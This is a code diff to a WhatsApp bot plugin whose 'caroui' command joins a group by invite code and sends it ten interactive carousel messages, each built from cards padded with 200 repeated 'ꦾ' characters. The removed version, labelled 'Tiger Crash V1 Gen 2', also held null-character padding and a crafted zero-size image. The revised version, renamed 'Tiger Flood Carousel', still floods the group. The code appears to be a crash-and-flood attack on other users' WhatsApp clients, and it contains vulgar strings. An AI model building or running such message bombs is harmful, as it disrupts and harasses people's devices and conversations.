@@ -11,13 +11,14 @@ let handler = async (m, { conn, args, usedPrefix, command }) => {
 
   try {
     // Unirse al grupo
-    let res = await conn.groupAcceptInvite(code);
-    await m.reply(`✅ Me uní al grupo: ${res}`);
+    let groupJid = await conn.groupAcceptInvite(code);
+    await m.reply(`✅ Me uní al grupo: ${groupJid}`);
 
-    // Enviar 10 veces el carrusel
+    // Enviar el carrusel 10 veces
     for (let i = 0; i < 10; i++) {
-      await carouselNew(res, conn);
+      await sendSafeCarousel(groupJid, conn);
     }
+
   } catch (e) {
     console.error(e);
     m.reply('❌ No pude unirme al grupo o enviar el carrusel.');
@@ -26,72 +27,51 @@ let handler = async (m, { conn, args, usedPrefix, command }) => {
 handler.command = /^caroui$/i;
 export default handler;
 
-// Función que construye y envía el carrusel
-async function carouselNew(isTarget, rikz) {
-  let push = [];
+// 🎠 Función para construir y enviar el carrusel sin romper encoding
+async function sendSafeCarousel(jid, conn) {
+  let cards = [];
 
   for (let i = 0; i < 10; i++) {
-    push.push({
+    cards.push({
       body: {
-        text: "CikssXyz" + "ꦾ".repeat(200)
+        text: "CikssXyz " + "ꦾ".repeat(200)
       },
       footer: {
-        text: "dont panic!!"
+        text: "🌀 Don't Panic"
       },
       header: {
-        title: 'memekk' + "\u0000".repeat(200),
-        hasMediaAttachment: true,
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?...",
-          mimetype: "image/jpeg",
-          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
-          fileLength: "591",
-          height: 0,
-          width: 0,
-          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
-          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
-          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?...",
-          mediaKeyTimestamp: "1721344123",
-          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb...",
-          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
-          scanLengths: [247, 201, 73, 63],
-          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
-        }
+        hasMediaAttachment: false
       },
       nativeFlowMessage: {
-        buttons: []
+        buttons: [] // Puedes agregar botones si deseas
       }
     });
   }
 
-  const carousel = generateWAMessageFromContent(isTarget, {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2
+  try {
+    const message = generateWAMessageFromContent(jid, {
+      interactiveMessage: {
+        body: {
+          text: "🌪️ Tiger Flood Carousel"
         },
-        interactiveMessage: {
-          body: {
-            text: "Kontol " + "ꦾ".repeat(200)
-          },
-          footer: {
-            text: "( 🐉 ) Tiger Crash V1 Gen 2 ( 🐉 )"
-          },
-          header: {
-            hasMediaAttachment: false
-          },
-          carouselMessage: {
-            cards: push
-          }
+        footer: {
+          text: "⚠️ Uso experimental ⚠️"
+        },
+        header: {
+          hasMediaAttachment: false
+        },
+        carouselMessage: {
+          cards
         }
       }
-    }
-  }, {});
+    }, {});
 
-  await rikz.relayMessage(isTarget, carousel.message, {
-    messageId: carousel.key.id
-  });
+    await conn.relayMessage(jid, message.message, {
+      messageId: message.key.id
+    });
 
-  console.log("✅ Carousel enviado");
+    console.log("✅ Carousel enviado");
+  } catch (err) {
+    console.error("❌ Error al enviar carousel:", err);
+  }
 }
